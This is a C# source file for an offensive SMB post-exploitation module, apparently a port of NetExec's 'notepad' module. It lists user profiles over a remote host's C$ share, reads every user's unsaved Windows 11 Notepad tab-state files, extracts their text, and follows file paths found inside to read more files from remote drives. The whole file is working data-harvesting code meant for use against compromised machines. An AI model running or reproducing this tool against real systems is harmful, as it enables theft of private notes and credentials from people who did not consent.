using System.Text;
using System.Text.RegularExpressions;
using Titanis;
using Titanis.Smb2;

namespace Atlas.Protocols.Smb.Modules;

/// <summary>
/// NetExec notepad: extracts new Windows Notepad tab-state binaries.
/// Options: KILL=True to kill notepad.exe on sharing violations (not supported - reported only).
/// </summary>
public sealed class SmbNotepadModule : AtlasModule<Smb2Client>
{
	public override string Name => "notepad";
	public override string Description => "Extracts new Notepad (Win11) unsaved tab-state files";

	private static readonly string[] SkipUsers = new[] { ".", "..", "desktop.ini", "Public", "Default", "Default User", "All Users", ".NET v4.5", ".NET v4.5 Classic" };

	public override async Task RunAsync(AtlasModuleContext<Smb2Client> ctx, CancellationToken cancellationToken)
	{
		int found = 0;
		try
		{
			foreach (var user in await ListUsersAsync(ctx, cancellationToken).ConfigureAwait(false))
			{
				cancellationToken.ThrowIfCancellationRequested();
				string tabDir = $"Users\\{user}\\AppData\\Local\\Packages\\Microsoft.WindowsNotepad_8wekyb3d8bbwe\\LocalState\\TabState";
				List<string> bins;
				try { bins = await ListFilesAsync(ctx, "C$", tabDir, cancellationToken).ConfigureAwait(false); }
				catch { continue; }
				foreach (var bin in bins)
				{
					if (!bin.EndsWith(".bin", StringComparison.OrdinalIgnoreCase)) continue;
					try
					{
						byte[] data = await ReadFileAsync(ctx, "C$", $"{tabDir}\\{bin}", cancellationToken).ConfigureAwait(false);
						var strings = ExtractStrings(data);
						if (strings.Count == 0) continue;
						found++;
						AtlasConsole.Success($"{ctx.Host}:445", $"(notepad) {user}\\{bin} ({data.Length} bytes, {strings.Count} strings):");
						foreach (var s in strings.Take(20))
							AtlasConsole.Info($"{ctx.Host}:445", $"(notepad)   {s}");
						// Follow embedded absolute paths (2nd stage)
						foreach (var s in strings)
						{
							var m = Regex.Match(s, @"^[A-Za-z]:\\(?:[^<>:\""/\\|?*]+\\)*[^<>:\""/\\|?*]+\.[\w]{1,5}$");
							if (!m.Success) continue;
							try
							{
								string drive = s[..2].ToUpperInvariant() == "C:" ? "C$" : s[..1] + "$";
								byte[] follow = await ReadFileAsync(ctx, drive, s[2..].TrimStart('\\'), cancellationToken).ConfigureAwait(false);
								AtlasConsole.Success($"{ctx.Host}:445", $"(notepad) embedded path {s} ({follow.Length} bytes)");
							}
							catch { }
						}
					}
					catch (Exception ex)
					{
						AtlasConsole.Warn($"{ctx.Host}:445", $"(notepad) {bin}: {ex.Message}");
					}
				}
			}
			AtlasConsole.Info($"{ctx.Host}:445", $"(notepad) {found} tab-state file(s) with content");
		}
		catch (Exception ex)
		{
			AtlasConsole.Fail($"{ctx.Host}:445", $"(notepad) Failed: {ex.Message}");
		}
	}

	private static async Task<List<string>> ListUsersAsync(AtlasModuleContext<Smb2Client> ctx, CancellationToken ct)
	{
		var users = new List<string>();
		await using var dir = await ctx.Client.OpenDirectoryAsync(new UncPath(ctx.Host, "C$", @"Users"), ct).ConfigureAwait(false);
		foreach (var e in await dir.QueryDirAsync(ct).ConfigureAwait(false))
		{
			if (!e.IsDirectory || SkipUsers.Contains(e.FileName, StringComparer.OrdinalIgnoreCase)) continue;
			users.Add(e.FileName);
		}
		return users;
	}

	private static async Task<List<string>> ListFilesAsync(AtlasModuleContext<Smb2Client> ctx, string share, string dir, CancellationToken ct)
	{
		var files = new List<string>();
		await using var d = await ctx.Client.OpenDirectoryAsync(new UncPath(ctx.Host, share, dir), ct).ConfigureAwait(false);
		foreach (var e in await d.QueryDirAsync(ct).ConfigureAwait(false))
		{
			if (e.FileName is "." or "..") continue;
			if (!e.IsDirectory) files.Add(e.FileName);
		}
		return files;
	}

	private static async Task<byte[]> ReadFileAsync(AtlasModuleContext<Smb2Client> ctx, string share, string path, CancellationToken ct)
	{
		await using var stream = await ctx.Client.OpenFileReadAsync(new UncPath(ctx.Host, share, path), ct).ConfigureAwait(false);
		using var ms = new MemoryStream();
		await stream.CopyToAsync(ms, ct).ConfigureAwait(false);
		return ms.ToArray();
	}

	private static List<string> ExtractStrings(byte[] data)
	{
		var out_ = new List<string>();
		var seen = new HashSet<string>();
		foreach (Match m in Regex.Matches(Encoding.ASCII.GetString(data), @"[ -~]{4,}"))
		{
			string s = m.Value.Trim();
			if (s.Length >= 4 && HasAlnum(s) && seen.Add(s)) out_.Add(s);
		}
		string u16 = Encoding.Unicode.GetString(data);
		foreach (Match m in Regex.Matches(u16, @"[\x20-\x7E]{4,}"))
		{
			string s = m.Value.Trim();
			if (s.Length >= 4 && HasAlnum(s) && seen.Add(s)) out_.Add(s);
		}
		return out_.Where(s => !s.StartsWith("NULL", StringComparison.Ordinal) && !s.StartsWith("http", StringComparison.OrdinalIgnoreCase)
			&& s is not ("true" or "false") && !s.Contains("xmlns", StringComparison.OrdinalIgnoreCase)).ToList();
	}

	private static bool HasAlnum(string s) => s.Any(char.IsLetterOrDigit);
}
